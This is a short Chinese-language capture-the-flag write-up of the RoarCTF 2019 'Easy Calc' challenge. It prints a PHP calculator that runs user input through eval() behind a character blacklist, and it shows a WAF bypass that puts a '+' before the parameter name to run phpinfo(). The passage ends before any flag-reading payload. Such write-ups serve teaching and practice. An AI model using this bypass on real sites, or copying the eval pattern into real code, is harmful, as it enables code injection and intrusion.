# [RoarCTF 2019]Easy Calc

打开是一个输入计算表达式的表单：

![image-20210927153425767](https://i.loli.net/2021/09/27/kc84qXnUFtdflMY.png)

点击计算会把数据提交到：`/calc.php?num=1+1`

直接访问 */calc.php* 得到源代码：

```php
<?php
error_reporting(0);
if (!isset($_GET['num'])) {
    show_source(__FILE__);
} else {
    $str = $_GET['num'];
    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $str)) {
            die("what are you want to do?");
        }
    }
    eval('echo '.$str.';');
}
```



访问 `/calc.php?num=phpinfo()` 会被WAF拦截，可以在参数前添加**+**号绕过：

`/calc.php?+num=phpinfo() `

![image-20210927165428588](https://i.loli.net/2021/09/27/hMdNI18aym7j36Z.png)



**clac.php** 中也过滤了许多关键词：

```php
$blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
```











